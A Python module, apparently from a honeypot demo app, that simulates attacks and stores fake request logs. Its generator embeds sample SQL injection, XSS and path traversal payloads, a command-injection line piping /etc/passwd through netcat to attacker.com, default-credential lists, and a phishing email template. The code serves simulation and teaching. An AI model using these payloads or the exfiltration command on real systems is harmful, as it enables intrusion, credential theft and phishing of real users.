import random
import socket
import ipaddress
from datetime import datetime
from app import db
from models import HoneypotAttack

# A dictionary to store our virtual honeypots
virtual_honeypots = {}

def create_honeypot(honeypot):
    """
    Create a virtual honeypot in our simplified environment
    
    Args:
        honeypot: A Honeypot model instance
    """
    honeypot_id = honeypot.id
    virtual_honeypots[honeypot_id] = {
        'ip': honeypot.ip_address,
        'port': honeypot.port,
        'service': honeypot.service_type,
        'status': 'active'
    }
    return True

def simulate_attack(honeypot):
    """
    Simulates an attack on a honeypot by generating realistic-looking attack data.
    
    Args:
        honeypot: A Honeypot model instance
    
    Returns:
        The created HoneypotAttack instance
    """
    # Generate a random source IP (avoiding private IP ranges)
    while True:
        random_ip = str(ipaddress.IPv4Address(random.randint(0, 2**32-1)))
        # Skip private IP ranges
        if not ipaddress.IPv4Address(random_ip).is_private:
            break
    
    # Potential attack types based on service
    attack_types = {
        'http': ['SQL Injection', 'XSS', 'Path Traversal', 'Command Injection', 'Bruteforce Login'],
        'ssh': ['Bruteforce', 'Dictionary Attack', 'Default Credentials'],
        'ftp': ['Anonymous Login', 'Bruteforce', 'Directory Traversal'],
        'smtp': ['Email Harvesting', 'Relay Testing', 'Bruteforce'],
        'telnet': ['Default Credentials', 'Bruteforce', 'Command Injection']
    }
    
    # Select attack type based on honeypot service
    service = honeypot.service_type
    attack_type = random.choice(attack_types.get(service, ['Unknown Attack']))
    
    # Generate realistic request data based on attack type and service
    request_data = generate_request_data(service, attack_type)
    
    # Create and save the attack
    attack = HoneypotAttack(
        source_ip=random_ip,
        attack_type=attack_type,
        request_data=request_data,
        honeypot_id=honeypot.id
    )
    
    db.session.add(attack)
    db.session.commit()
    
    return attack

def generate_request_data(service, attack_type):
    """
    Generate realistic-looking request data based on service and attack type
    
    Args:
        service: The honeypot service type
        attack_type: The type of attack
    
    Returns:
        A string containing simulated request data
    """
    if service == 'http':
        if attack_type == 'SQL Injection':
            paths = ['/login.php', '/admin.php', '/search.php', '/product.php']
            payloads = ["' OR 1=1 --", "'; DROP TABLE users; --", "' UNION SELECT username,password FROM users --"]
            
            path = random.choice(paths)
            payload = random.choice(payloads)
            
            return f"""
GET {path}?id={payload} HTTP/1.1
Host: {random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Accept: text/html,application/xhtml+xml
Connection: keep-alive
            """
        
        elif attack_type == 'XSS':
            paths = ['/comment.php', '/profile.php', '/message.php']
            payloads = ["<script>alert('XSS')</script>", "<img src=x onerror=alert('XSS')>", "<svg onload=alert('XSS')>"]
            
            path = random.choice(paths)
            payload = random.choice(payloads)
            
            return f"""
POST {path} HTTP/1.1
Host: {random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Content-Type: application/x-www-form-urlencoded
Content-Length: {len(f"comment={payload}")}

comment={payload}
            """
        
        elif attack_type == 'Path Traversal':
            paths = ['/download.php', '/view.php', '/image.php']
            payloads = ["../../../etc/passwd", "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts", "../../.env"]
            
            path = random.choice(paths)
            payload = random.choice(payloads)
            
            return f"""
GET {path}?file={payload} HTTP/1.1
Host: {random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Accept: text/html,application/xhtml+xml
Connection: keep-alive
            """
        
        else:  # Default or Command Injection
            return f"""
POST /admin.php HTTP/1.1
Host: {random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Content-Type: application/x-www-form-urlencoded
Content-Length: 25

cmd=cat /etc/passwd | nc attacker.com 9999
            """
    
    elif service == 'ssh':
        usernames = ['root', 'admin', 'user', 'test', 'guest', 'oracle', 'mysql']
        passwords = ['password', 'admin', '123456', 'qwerty', 'root', 'toor', 'pass123']
        
        username = random.choice(usernames)
        password = random.choice(passwords)
        
        return f"""
SSH-2.0-OpenSSH_7.6p1 Ubuntu-4ubuntu0.3
Attempt: {username} / {password}
Failed login attempt from {random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}
            """
    
    elif service == 'ftp':
        usernames = ['anonymous', 'admin', 'ftp', 'user', 'test']
        passwords = ['', 'anonymous', 'admin', 'ftp', 'test123']
        
        username = random.choice(usernames)
        password = random.choice(passwords)
        
        commands = ['LIST', 'CWD /', 'CWD ../', 'STOR malware.exe', 'GET /etc/passwd']
        command = random.choice(commands)
        
        return f"""
220 FTP Server Ready
USER {username}
331 Password required
PASS {password}
230 User logged in
{command}
            """
    
    elif service == 'smtp':
        return f"""
EHLO attacker.com
MAIL FROM: <phish@attacker.com>
RCPT TO: <victim@target.com>
DATA
From: "IT Department" <it@{random.choice(['company.com', 'org.com', 'corp.net'])}>
To: <victim@target.com>
Subject: Urgent: Password Reset Required

Your account has been compromised. Please reset your password immediately:
http://malicious-site.com/reset?token=123456

IT Department
.
            """
    
    elif service == 'telnet':
        usernames = ['root', 'admin', 'cisco', 'user', 'telnet']
        passwords = ['password', 'admin', 'cisco', 'telnet', 'default']
        
        username = random.choice(usernames)
        password = random.choice(passwords)
        
        return f"""
Trying {random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}...
Connected
login: {username}
password: {password}
Login incorrect
            """
    
    else:
        return f"Unknown attack data for service: {service}"

def get_honeypot_status(honeypot_id):
    """
    Get the status of a virtual honeypot
    
    Args:
        honeypot_id: The ID of the honeypot
    
    Returns:
        A dictionary with status information
    """
    if honeypot_id in virtual_honeypots:
        return {
            'status': virtual_honeypots[honeypot_id]['status'],
            'uptime': random.randint(1, 1000),  # Simulated uptime in minutes
            'connections': random.randint(0, 100)  # Simulated connection count
        }
    return {'status': 'not found'}
